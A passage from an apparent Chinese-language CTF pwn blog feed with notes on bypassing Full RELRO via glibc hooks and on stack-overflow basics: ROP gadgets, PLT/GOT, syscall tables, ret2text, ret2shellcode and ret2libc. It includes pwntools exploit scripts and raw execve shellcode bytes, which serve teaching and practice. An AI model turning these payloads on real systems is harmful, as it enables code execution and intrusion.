表的权限改成“只读 (<code>r--</code>)”</strong>！</p></li><li><p><strong>影响：</strong> 一旦开启，GOT 表劫持彻底宣告死亡。如果你用 Payload 强行往 GOT 表地址里写数据，程序会当场抛出段错误 (Segmentation Fault) 并崩溃。</p></li></ul><h2 id="突破-Full-RELRO：寻找“替身”指针"><a href="#突破-Full-RELRO：寻找“替身”指针" class="headerlink" title="突破 Full RELRO：寻找“替身”指针"></a>突破 Full RELRO：寻找“替身”指针</h2><p>既然 GOT 表被锁进了保险箱，我们就不能死磕了。我们的核心思路是：<strong>在内存中寻找其他依然“可读可写”，并且“必定会被程序调用”的函数指针！</strong></p><p>其中最经典、最好用的替身，就藏在 <code>libc.so</code> 里：</p><h3 id="替身一：劫持-Hook-函数-malloc-hook-free-hook"><a href="#替身一：劫持-Hook-函数-malloc-hook-free-hook" class="headerlink" title="替身一：劫持 Hook 函数 (__malloc_hook / __free_hook)"></a>替身一：劫持 Hook 函数 (<code>__malloc_hook</code> / <code>__free_hook</code>)</h3><p>在 Linux 的标准 C 库 (glibc) 中，为了方便程序员调试内存泄漏，开发者预留了几个钩子（Hook）变量。它们存放在 libc 的可读写数据段（<code>.data</code> 或 <code>.bss</code>）中。</p><p><strong>工作原理：</strong> 当程序调用 <code>malloc()</code> 时，底层会先去检查 <code>__malloc_hook</code> 这个变量里有没有存放地址。如果有，它就会先去执行这个地址里的代码；<code>free()</code> 和 <code>__free_hook</code> 同理。</p><p><strong>利用手法：</strong> 我们通过漏洞（比如格式化字符串或堆溢出），把 <code>system</code> 的地址或者 <code>one_gadget</code> 的地址，写进 <code>__free_hook</code> 中。接下来，只要程序代码里执行了 <code>free(chunk)</code>，并且 <code>chunk</code> 里面刚好装着字符串 <code>/bin/sh</code>，就完美等价于执行了 <code>system(&quot;/bin/sh&quot;)</code>！</p><p><strong>Pwntools 实战寻址：</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 前提：你已经通过漏洞泄露并计算出了 libc_base</span></span><br><span class="line">libc.address = libc_base</span><br><span class="line"></span><br><span class="line"><span class="comment"># 获取 free_hook 在当前运行时的绝对地址</span></span><br><span class="line">free_hook_addr = libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>] </span><br><span class="line">system_addr = libc.sym[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line"><span class="comment"># 接下来利用你的任意写漏洞，把 system_addr 写入 free_hook_addr</span></span><br></pre></td></tr></table></figure><h3 id="替身二：劫持退出函数-exit-funcs-tls-dtor-list"><a href="#替身二：劫持退出函数-exit-funcs-tls-dtor-list" class="headerlink" title="替身二：劫持退出函数 (__exit_funcs / tls_dtor_list)"></a>替身二：劫持退出函数 (<code>__exit_funcs</code> / <code>tls_dtor_list</code>)</h3><p>如果程序没有任何漏洞可以触发 <code>malloc</code> 或 <code>free</code> 怎么办？只要程序最终会调用 <code>exit()</code> 正常退出，或者从 <code>main</code> 函数 <code>return</code>，它就会去执行注册在 <code>__exit_funcs</code> 列表里的收尾函数。</p><p><strong>利用手法：</strong> 找到这个列表的指针，将其覆盖为我们要执行的后门地址。当程序“自以为”在正常退出时，实际上却启动了我们的 Shell。</p><h3 id="替身三：既然不让改指针，那就改栈！（栈迁移）"><a href="#替身三：既然不让改指针，那就改栈！（栈迁移）" class="headerlink" title="替身三：既然不让改指针，那就改栈！（栈迁移）"></a>替身三：既然不让改指针，那就改栈！（栈迁移）</h3><p>如果题目既开启了 Full RELRO，又是极其严苛的栈溢出（比如溢出长度只有区区 8 个字节，刚够覆盖 <code>rbp</code> 和 <code>ret</code>，根本写不下一条完整的 ROP 链），而且也没有任意地址写漏洞去改 Hook 怎么办？</p><p>这时候，我们就彻底放弃“修改已有的函数指针”，转而劫持 RSP（栈顶指针），把整个栈强行搬到我们提前布置好数据的 BSS 段或堆上去执行</p><p>详见栈迁移</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;前言：&quot;&gt;&lt;a href=&quot;#前言：&quot; class=&quot;headerlink&quot; title=&quot;前言：&quot;&gt;&lt;/a&gt;前言：&lt;/h1&gt;&lt;p&gt;在现代操作系统中，单纯的栈溢出已经很难直接奏效。编译器和系统引入了多种保护机制，其中最与栈溢出相关的就是 &lt;strong&gt;Canar</summary>
      
    
    
    
    <category term="PWN" scheme="http://example.com/categories/PWN/"/>
    
    <category term="PWN_ATTACK" scheme="http://example.com/categories/PWN/PWN-ATTACK/"/>
    
    <category term="stack_overflow" scheme="http://example.com/categories/PWN/PWN-ATTACK/stack-overflow/"/>
    
    
    <category term="pwn" scheme="http://example.com/tags/pwn/"/>
    
    <category term="栈溢出" scheme="http://example.com/tags/%E6%A0%88%E6%BA%A2%E5%87%BA/"/>
    
    <category term="Canary" scheme="http://example.com/tags/Canary/"/>
    
    <category term="PIE" scheme="http://example.com/tags/PIE/"/>
    
    <category term="ASLR" scheme="http://example.com/tags/ASLR/"/>
    
  </entry>
  
  <entry>
    <title></title>
    <link href="http://example.com/2026/03/12/REVERSE/js%E9%80%86%E5%90%91/js%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/js%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8/"/>
    <id>http://example.com/2026/03/12/REVERSE/js%E9%80%86%E5%90%91/js%E9%80%86%E5%90%91%E5%9F%BA%E7%A1%80/js%E9%80%86%E5%90%91%E5%85%A5%E9%97%A8/</id>
    <published>2026-03-12T11:42:54.645Z</published>
    <updated>2026-03-12T11:42:54.645Z</updated>
    
    
    
    
    
  </entry>
  
  <entry>
    <title>栈溢出基础总结</title>
    <link href="http://example.com/2026/03/12/PWN/pwn_attack/stack_overflow/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/"/>
    <id>http://example.com/2026/03/12/PWN/pwn_attack/stack_overflow/%E6%A0%88%E6%BA%A2%E5%87%BA%E5%9F%BA%E7%A1%80/</id>
    <published>2026-03-12T02:00:00.000Z</published>
    <updated>2026-03-14T13:23:58.687Z</updated>
    
    <content type="html"><![CDATA[<h1 id="前言："><a href="#前言：" class="headerlink" title="前言："></a>前言：</h1><p>之前pwn写到别的地方没往github搬，后面慢慢搬吧</p><h1 id="栈溢出基础知识："><a href="#栈溢出基础知识：" class="headerlink" title="栈溢出基础知识："></a>栈溢出基础知识：</h1><h2 id="栈溢出覆盖方向："><a href="#栈溢出覆盖方向：" class="headerlink" title="栈溢出覆盖方向："></a>栈溢出覆盖方向：</h2><p>当程序使用 <code>read</code>、<code>gets</code> 或者你在打 payload 时，数据的写入方向永远是<strong>从低地址向高地址</strong>蔓延的。</p><p>假设栈上原本有一个 4 字节的整数 <code>0x30405060</code>（在这个数值里，<code>0x60</code> 是最低位字节，<code>0x30</code> 是最高位字节）。它在真实的物理内存里是这样排列的：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内存低地址 -----&gt; 内存高地址</span><br><span class="line">[ 0x60 ]  [ 0x50 ]  [ 0x40 ]  [ 0x30 ]</span><br></pre></td></tr></table></figure><p>如果向栈内读入一个0x55;</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">内存低地址 -----&gt; 内存高地址</span><br><span class="line">[ 0x55 ]  [ 0x50 ]  [ 0x40 ]  [ 0x30 ]</span><br></pre></td></tr></table></figure><p>数值就变成了：<strong><code>0x30405055</code></strong></p><h2 id="栈帧结构与工作原理"><a href="#栈帧结构与工作原理" class="headerlink" title="栈帧结构与工作原理"></a>栈帧结构与工作原理</h2><p>栈在调用call时，示意图</p><p>在call之前:</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">push</span> arg2</span><br><span class="line"><span class="keyword">push</span> arg1</span><br><span class="line"><span class="symbol">call</span> func</span><br></pre></td></tr></table></figure><p>在call之后:</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">func:</span></span><br><span class="line">    <span class="keyword">push</span> ebp        <span class="comment">; 保存调用者栈基址</span></span><br><span class="line">    <span class="keyword">mov</span> ebp, esp    <span class="comment">; 建立当前栈帧</span></span><br><span class="line">    <span class="keyword">sub</span> esp, <span class="number">0x20</span>   <span class="comment">; 分配局部变量</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">mov</span> eax, [ebp+<span class="number">8</span>]  <span class="comment">; arg1</span></span><br><span class="line">    <span class="keyword">mov</span> ebx, [ebp+<span class="number">12</span>] <span class="comment">; arg2</span></span><br></pre></td></tr></table></figure><p>call后栈存储：</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">高地址</span><br><span class="line">+<span class="comment">-----------------+</span></span><br><span class="line">| 参数 arg2       |  ← 调用者压入的参数</span><br><span class="line">+<span class="comment">-----------------+</span></span><br><span class="line">| 参数 arg1       |</span><br><span class="line">+<span class="comment">-----------------+</span></span><br><span class="line">| <span class="keyword">return</span> address  |  ← call 指令压入</span><br><span class="line">+<span class="comment">-----------------+</span></span><br><span class="line">| saved EBP       |  ← push ebp</span><br><span class="line">+<span class="comment">-----------------+</span></span><br><span class="line">| <span class="keyword">local</span> var ...   |  ← <span class="built_in">sub</span> esp, <span class="number">0x14</span></span><br><span class="line">| <span class="keyword">local</span> var ...   |</span><br><span class="line">| <span class="keyword">local</span> var ...   |</span><br><span class="line">+<span class="comment">-----------------+</span></span><br><span class="line">低地址</span><br></pre></td></tr></table></figure><h2 id="32位系统和64位系统的区别"><a href="#32位系统和64位系统的区别" class="headerlink" title="32位系统和64位系统的区别"></a>32位系统和64位系统的区别</h2><h3 id="函数传参方式的根本差异"><a href="#函数传参方式的根本差异" class="headerlink" title="函数传参方式的根本差异"></a>函数传参方式的根本差异</h3><p>32位与64位系统在函数传参上有显著区别：</p><p><strong>32位下：</strong> 函数参数是通过<strong>栈传递</strong>的。</p><p><strong>64位下：</strong> 函数参数主要是通过<strong>寄存器传递</strong>的，前6个参数对应的寄存器依次为 <code>rdi</code>、<code>rsi</code>、<code>rdx</code>、<code>rcx</code>、<code>r8</code>、<code>r9</code>。</p><h3 id="系统调用约定-Syscall"><a href="#系统调用约定-Syscall" class="headerlink" title="系统调用约定 (Syscall)"></a>系统调用约定 (Syscall)</h3><p>当栈不可执行且程序无 <code>system</code> 函数时，我们需要直接调用底层系统调用（如 <code>execve</code>）。</p><p><strong>32 位 Linux：</strong> 触发方式：使用 <code>int 0x80</code> 或 <code>sysenter</code>。</p><p>参数寄存器：<code>eax</code> = 系统调用号，参数依次放在 <code>ebx</code>, <code>ecx</code>, <code>edx</code>, <code>esi</code>, <code>edi</code>, <code>ebp</code> 中。</p><p>函数返回值放在eax</p><p><strong>64 位 Linux：</strong> 触发方式：使用 <code>syscall</code> 指令。</p><p>参数寄存器：<code>rax</code> = 系统调用号，参数依次放在 <code>rdi</code>, <code>rsi</code>, <code>rdx</code>, <code>r10</code>, <code>r8</code>, <code>r9</code> 中（注意第4个参数是 <code>r10</code> 而不是 <code>rcx</code>，因为 <code>rcx</code> 被用来保存<strong>返回地址</strong>，CPU 会将<strong>返回地址</strong>（即 <code>syscall</code> 指令的下一条指令的地址）<strong>自动保存到 <code>rcx</code> 寄存器</strong>。当系统调用结束返回时（<code>sysret</code> 指令），CPU 再从 <code>rcx</code> 中取出地址跳回去继续执行。）</p><p>函数返回值放在rax</p><p>int 0x80和syscall的作用时进入内核状态，执行我们现在设置好的内核函数</p><h3 id="数据宽度与地址特性"><a href="#数据宽度与地址特性" class="headerlink" title="数据宽度与地址特性"></a>数据宽度与地址特性</h3><p><strong>32 位系统：</strong> 寄存器和栈上的每个“格子”是 4 个字节（32 bit）。写 Pwn 脚本时，地址和数据都要用 <code>p32()</code> 打包。</p><p><strong>64 位系统：</strong> 寄存器和栈上的每个“格子”是 8 个字节（64 bit），写脚本用 <code>p64()</code> 打包。更重要的是，在 64 位程序里，指针地址通常只有低 6 个字节是有意义的，比如 <code>0x00007ffff7a0b000</code>，它的高位全都是 <code>\x00</code>。</p><p>_避坑点_：因为 64 位地址自带 <code>\x00</code>（字符串结束符），如果你溢出利用的是 <code>strcpy</code> 这类遇到 <code>\x00</code> 就停止拷贝的函数，你的 Payload 就会被硬生生截断！而 32 位的地址（如 <code>0x08048460</code>）通常没有这种烦恼。</p><h2 id="常用系统调用号速查表-Syscall-Table"><a href="#常用系统调用号速查表-Syscall-Table" class="headerlink" title="常用系统调用号速查表 (Syscall Table)"></a>常用系统调用号速查表 (Syscall Table)</h2><p>在构造 <code>ret2syscall</code> 或手写 Shellcode 时，我们必须准确设置系统调用号。</p><p>请特别注意：<strong>Linux 下 32 位和 64 位的系统调用号是完全不同的！</strong> 以下是 Pwn 题中最常被用到的几个系统调用及其编号：</p><div class="table-container"><table><thead><tr><th style="text-align:left">功能说明</th><th style="text-align:left">对应 C 语言函数</th><th style="text-align:left">32位调用号 (EAX)</th><th style="text-align:left">64位调用号 (RAX)</th><th style="text-align:left">常用 Pwn 场景</th></tr></thead><tbody><tr><td style="text-align:left"><strong>执行程序</strong></td><td style="text-align:left"><code>sys_execve</code></td><td style="text-align:left"><code>11</code> (<code>0xb</code>)</td><td style="text-align:left"><code>59</code> (<code>0x3b</code>)</td><td style="text-align:left"><code>ret2syscall</code> 直接拿 <code>/bin/sh</code> 的 Shell</td></tr><tr><td style="text-align:left"><strong>读文件/输入</strong></td><td style="text-align:left"><code>sys_read</code></td><td style="text-align:left"><code>3</code></td><td style="text-align:left"><code>0</code></td><td style="text-align:left">ORW 漏洞链读取 flag / 再次触发输入</td></tr><tr><td style="text-align:left"><strong>写文件/输出</strong></td><td style="text-align:left"><code>sys_write</code></td><td style="text-align:left"><code>4</code></td><td style="text-align:left"><code>1</code></td><td style="text-align:left">ORW 漏洞链将 flag 打印到屏幕</td></tr><tr><td style="text-align:left"><strong>打开文件</strong></td><td style="text-align:left"><code>sys_open</code></td><td style="text-align:left"><code>5</code></td><td style="text-align:left"><code>2</code></td><td style="text-align:left">ORW 漏洞链打开 flag 文件</td></tr><tr><td style="text-align:left"><strong>退出程序</strong></td><td style="text-align:left"><code>sys_exit</code></td><td style="text-align:left"><code>1</code></td><td style="text-align:left"><code>60</code> (<code>0x3c</code>)</td><td style="text-align:left">保持栈平衡优雅退出，防止程序崩溃引发报警</td></tr></tbody></table></div><p>(注：32位下 execve 为 0xb，64位下为 59。64位下 read 的调用号为 0。另外，在 64 位下，由于很多现代 Linux 系统推荐使用 <code>openat</code> 替代 <code>open</code>，<code>openat</code> 的调用号是 <code>257</code> (<code>0x101</code>)，这在较新的沙盒题中经常遇到。)<br><strong>实战查表小技巧</strong><br>如果你在打比赛时忘了某个系统调用号，且不能联网，可以直接在 Linux 终端用自带的头文件搜索： </p><p><strong>查 32 位：</strong> <code>cat /usr/include/asm/unistd_32.h | grep &quot;execve&quot;</code><br><strong>查 64 位：</strong> <code>cat /usr/include/asm/unistd_64.h | grep &quot;execve&quot;</code></p><h2 id="页对齐与随机化本质"><a href="#页对齐与随机化本质" class="headerlink" title="页对齐与随机化本质"></a>页对齐与随机化本质</h2><p>无论是主程序（ELF 文件）还是动态库（libc 等），加载到内存时都必须<strong>页对齐</strong>。</p><p>页大小为 <code>0x1000 = 4096B</code>，所以加载基址的低12位（十六进制最后三位数）始终为 0。</p><p><strong>低12位是页内偏移，永远是固定的，不会随着 ASLR 随机化</strong>。被 ASLR 随机化的是高位的页号（Page Number）。</p><h2 id="栈对齐玄学理论概念"><a href="#栈对齐玄学理论概念" class="headerlink" title="栈对齐玄学理论概念"></a>栈对齐玄学理论概念</h2><p><strong>底层原因：</strong> 在较新的 Ubuntu 系统（glibc 2.27 及以上版本）中，调用 <code>system</code>、<code>printf</code> 等函数时，底层有一条叫做 <code>movaps</code> 的汇编指令。这条指令极其苛刻，它要求当前栈顶指针 <code>rsp</code> 的地址必须是 <strong>16 字节对齐</strong>（即 <code>rsp</code> 地址最后一位必须是 <code>0</code>）。</p><p>如果你在构造ROP 链时，溢出覆盖完后 <code>rsp</code> 刚好差了 8 个字节（没有对齐），哪怕你的参数全对，程序也会在进入 <code>system</code> 内部时直接崩溃（Segmentation Fault）。这就是为什么我们要在调用 <code>system</code> 前额外垫一个空指令 <code>ret</code>（它相当于让 <code>rsp</code> 再往下走 8 个字节），强行把栈给对齐</p><h2 id="构造ROP链理论基础："><a href="#构造ROP链理论基础：" class="headerlink" title="构造ROP链理论基础："></a>构造ROP链理论基础：</h2><p>理解rop链底层原理只需要看下面这三个东西</p><ul><li><p><strong><code>rip</code>（指令指针寄存器）</strong></p></li><li><p><strong><code>rsp</code>（栈顶指针寄存器）</strong></p></li><li><p><strong>栈（Stack）</strong></p></li></ul><p>rop链本质是通过pop 和ret指令来给寄存器赋值，我们需要找到gadget来控制执行流</p><h3 id="pop-寄存器（比如-pop-rdi）"><a href="#pop-寄存器（比如-pop-rdi）" class="headerlink" title="pop 寄存器（比如 pop rdi）"></a><code>pop 寄存器</code>（比如 <code>pop rdi</code>）</h3><p><strong>动作 A（取值）</strong>：把当前 <code>rsp</code> 指向的地方（栈顶的内容，8个字节），原封不动地复制到 <code>rdi</code> 寄存器里。</p><p><strong>动作 B（移位）</strong>：把 <code>rsp</code> 往下（高地址方向）移动 8 个字节（<code>rsp = rsp + 8</code>）。</p><p> <strong>一句话总结：<code>pop rdi</code> 就是“吃掉”当前栈顶的 8 个字节给 rdi，然后把栈顶指针让给下一个数据。</strong></p><h3 id="ret（返回指令）"><a href="#ret（返回指令）" class="headerlink" title="ret（返回指令）"></a><code>ret</code>（返回指令）</h3><p>你以为它是“函数结束”，但在 CPU 底层，<code>ret</code> 等价于一条指令：<strong><code>pop rip</code></strong>。</p><p><strong>动作 A（取值）</strong>：把当前 <code>rsp</code>指向的地方（栈顶的 8 个字节），强行塞进 <code>rip</code>里</p><p><strong>动作 B（移位）</strong>：<code>rsp</code> 往下移动 8 个字节（<code>rsp = rsp + 8</code>）。</p><p> <strong>一句话总结：<code>ret</code> 就是把当前栈顶的数据当作“下一条要执行的指令地址”，让 CPU 飞过去，同时栈顶指针往下挪一格。</strong></p><p>所以某些payload ：</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload = padding + p64(pop_rdi_ret的地址) + p64(data数据) + p64(system函数的地址)</span><br></pre></td></tr></table></figure><p>通过这样的方式就可以把data 赋值给rdi了</p><h3 id="找gadget的方法："><a href="#找gadget的方法：" class="headerlink" title="找gadget的方法："></a>找gadget的方法：</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary ./pwn | grep <span class="string">&quot;pop rdi&quot;</span></span><br></pre></td></tr></table></figure><p>如果只想看<code>pop</code>和<code>ret</code>指令，可以配合<code>--only</code>参数使结果更精确：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ROPgadget --binary [目标文件] --only <span class="string">&quot;pop|ret&quot;</span> | grep <span class="string">&quot;pop rdi&quot;</span></span><br></pre></td></tr></table></figure><p>结果类似下面：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x0000000000401234 : pop rdi ; ret</span><br></pre></td></tr></table></figure><p>前面就是gadget的地址</p><h2 id="Ret2libc中plt表和got表的区别及其作用"><a href="#Ret2libc中plt表和got表的区别及其作用" class="headerlink" title="Ret2libc中plt表和got表的区别及其作用"></a>Ret2libc中plt表和got表的区别及其作用</h2><div class="table-container"><table><thead><tr><th><strong>对比维度</strong></th><th><strong>PLT 表 (Procedure Linkage Table)</strong></th><th><strong>GOT 表 (Global Offset Table)</strong></th></tr></thead><tbody><tr><td><strong>中文名</strong></td><td>过程链接表</td><td>全局偏移表</td></tr><tr><td><strong>本质</strong></td><td><strong>代码段</strong>（一段段可执行的汇编指令）</td><td><strong>数据段</strong>（一个个存放地址的指针数组）</td></tr><tr><td><strong>内存权限</strong></td><td>可读、可执行 (<code>r-x</code>)</td><td>可读、可写 (<code>rw-</code>) _(注：开启 Full RELRO 后变为只读)_</td></tr><tr><td><strong>存放位置</strong></td><td><code>.plt</code> 段</td><td><code>.got.plt</code> 段（通常简称为 GOT 表）</td></tr><tr><td><strong>作用</strong></td><td>负责把程序的调用请求，转交给对应的 GOT 表项。</td><td>里面记录着真正函数的实际内存地址。</td></tr></tbody></table></div><h3 id="plt和got表运行过程："><a href="#plt和got表运行过程：" class="headerlink" title="plt和got表运行过程："></a>plt和got表运行过程：</h3><p>当程序编译出来但是没运行时：</p><ul><li><strong>PLT 地址：</strong> 是固定的。比如在 IDA 里看到 <code>.plt</code> 段有个 <code>puts@plt</code>，地址是 <code>0x400560</code>。</li></ul><p>plt的地址一般存的是一串代码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">; 这里就是 puts@plt (0x400560) 内部真正的样子</span><br><span class="line">0x400560:  jmp qword ptr [0x601018]  ; &lt;--- 注意看这第一条指令！</span><br><span class="line">0x400566:  push 0x0                  ; 如果是第一次调用，给动态链接器传编号</span><br><span class="line">0x40056b:  jmp 0x400550              ; 呼叫动态链接器 (_dl_runtime_resolve)</span><br></pre></td></tr></table></figure><ul><li><strong>GOT 地址（虚拟地址）：</strong> 也是固定的。比如 <code>.got.plt</code> 段有个 <code>puts_got</code>，地址是 <code>0x601018</code>。<strong>注意：这个 <code>0x601018</code> 只是存放puts函数真实地址的地址</strong>，也就是说[0x601018]存的就是puts函数的地址。</li></ul><p>程序运行时：<br>Linux 为了启动快，采用了<strong>延迟绑定 (Lazy Binding)</strong> 机制。也就是说，程序刚跑起来时，GOT 表里其实是没有真实地址的。</p><ul><li><p><strong>第一次调用 <code>puts</code>：</strong></p><ol><li><p>程序跳到 <code>puts@plt</code> (<code>0x400560</code>)。</p></li><li><p><code>PLT</code> 去看 <code>GOT</code> 表（<code>0x601018</code>）里存了啥。</p></li><li><p>此时 <code>GOT</code> 表里存的还是 <code>PLT</code> 的下一条指令地址（跳回去了）。</p></li><li><p>接着触发动态链接器（<code>_dl_runtime_resolve</code>），链接器去 <code>libc.so</code> 里找到 <code>puts</code> 的<strong>真实地址</strong>（比如 <code>0x7ffff7a94300</code>）。</p></li><li><p>链接器把这个真实地址写进 <code>0x601018</code> 这个格子里，然后执行 <code>puts</code>。</p></li></ol></li><li><p><strong>第二次调用 <code>puts</code>：</strong></p><ol><li><p>程序跳到 <code>puts@plt</code>。</p></li><li><p><code>PLT</code> 去看 <code>GOT</code> 表。</p></li><li><p>这次 <code>GOT</code> 表里已经是<strong>真实地址</strong> (<code>0x7ffff7a94300</code>) 了。</p></li><li><p>直接去执行</p></li></ol></li></ul><h3 id="plt表和got表的使用："><a href="#plt表和got表的使用：" class="headerlink" title="plt表和got表的使用："></a>plt表和got表的使用：</h3><p>在写 EXP 脚本时，我们到底什么时候用 <code>.plt</code>，什么时候用 <code>.got</code>？</p><ol><li><code>elf.plt[&#39;xxx&#39;]</code> —— 你的目的是“调用/执行”它</li></ol><p>当你构造 ROP 链，想要让程序去<strong>执行</strong>某个函数时，用 PLT 地址。</p><ul><li><strong>底层含义：</strong> 你获取的是 IDA 中固定的那段执行代码的地址。因为 PLT 会通过 GOT 去动态解析 libc 里的真正地址。</li><li><strong>打印：</strong></li></ul><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 你想让程序打印东西，就直接跳到 puts 的 PLT 存根去执行</span></span><br><span class="line">payload = p64(pop_rdi_ret) + p64(got_addr) + p64(elf.plt[<span class="string">&#x27;puts&#x27;</span>]) </span><br><span class="line"><span class="comment"># 经典用法：直接调用 plt 表里的 system</span></span><br><span class="line">adr_system = elf.plt[<span class="string">&#x27;system&#x27;</span>]</span><br></pre></td></tr></table></figure><ol><li><code>elf.got[&#39;xxx&#39;]</code> —— 你的目的是“泄露”或“篡改”它（因为got表存的是数据，rdi到这里直接报错，除非栈可执行）</li></ol><p>当你需要知道某个函数在 <code>libc</code> 中的真实内存地址，或者你想把某个函数劫持掉时，用 GOT 地址。</p><ul><li><p><strong>底层含义：</strong> 你获取的是那个<strong>存放了真实地址的“格子”的固定虚拟地址</strong>。给出的永远是程序的 GOT 表项地址，不是 libc 的真实函数地址。</p></li><li><p><strong>泄露：</strong></p><pre><code># 你的笔记中的经典用法：把 GOT 表项的地址传给 puts 去打印，以此泄露里面装的真实 libc 地址adr_libc_main = elf.got[&#39;__libc_start_main&#39;]payload = b&#39;a&#39;*18 + p64(adr_rdi) + p64(adr_libc_main) + p64(adr_puts) ...</code></pre></li><li><p><strong>GOT 表劫持）：</strong> 假设题目存在任意地址写漏洞（比如格式化字符串漏洞），你可以把 <code>elf.got[&#39;printf&#39;]</code> 里的内容，改写成 <code>system</code> 的真实地址。这样程序下次再调用 <code>printf(&quot;/bin/sh&quot;)</code> 时，实际上执行的是 <code>system(&quot;/bin/sh&quot;)</code>！</p></li></ul><h1 id="基础攻击方法分类"><a href="#基础攻击方法分类" class="headerlink" title="基础攻击方法分类"></a>基础攻击方法分类</h1><h2 id="Ret2text"><a href="#Ret2text" class="headerlink" title="Ret2text"></a>Ret2text</h2><p>最基础的溢出利用，直接覆盖返回地址，跳转到程序自带的后门函数或目标地址。</p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2text&#x27;</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">sh.sendline(<span class="string">b&#x27;A&#x27;</span> * (<span class="number">0x6c</span> + <span class="number">4</span>) + p32(target)) <span class="comment"># 覆盖旧的ebp后紧跟返回地址</span></span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="Ret2shellcode"><a href="#Ret2shellcode" class="headerlink" title="Ret2shellcode"></a>Ret2shellcode</h2><p>当存在可执行的内存段（如未开启 NX 保护的栈，或可读写执行的 <code>.bss</code> 段）时，可以写入自定义的恶意机器码（shellcode）并跳转执行。</p><ul><li><p><strong>32位短字节 shellcode (21字节)：</strong> <code>\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80</code></p></li><li><p><strong>64位较短 shellcode (23字节)：</strong> <code>\x48\x31\xf6\x56\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5f\x6a\x3b\x58\x99\x0f\x05</code></p></li></ul><p><strong>利用脚本示例（向 bss 段写 shellcode 并跳转）：</strong></p><figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">&#x27;./ret2shellcode&#x27;</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">b&#x27;A&#x27;</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure><h2 id="Ret2libc"><a href="#Ret2libc" class="headerlink" title="Ret2libc"></a>Ret2libc</h2><p><strong>适用场景：</strong> 程序开启了 NX 保护（栈不可执行），且为动态链接程序（运行时加载 <code>libc.so</code>）。</p><p>判断：<br>用 file 命令</p><p>file ./a.out</p><p>如果输出里有 “dynamically linked”，说明它运行时要加载 libc。</p><p>如果写着 “statically linked”，说明它已经把 libc 打包进 ELF，不需要外部 libc。</p><h3 id="重要概念："><a href="#重要概念：" class="headerlink" title="重要概念："></a>重要概念：</h3><p>虚拟地址：ida pro存放printf函数的got.plt对应的地址，比如pwntools里写elf.got[‘printf’]拿到的就是printf的虚拟地址，虚拟地址里存放的值才是真实地址</p><p>真实地址：运行时printf函数的真实地址，也就是got表项虚拟地址里存放的值</p><p>libc基址：libc.so的基地址</p><p>libc偏移：libc.so中printf函数的真实地址与libc.so的基地址的差值</p><p>ret2libc分四种情况，每种情况又分32位和64位架构都有对应模板：</p><h3 id="32位"><a href="#32位" class="headerlink" title="32位"></a>32位</h3><h4 id="有sys，有shell"><a href="#有sys，有shell" class="headerlink" 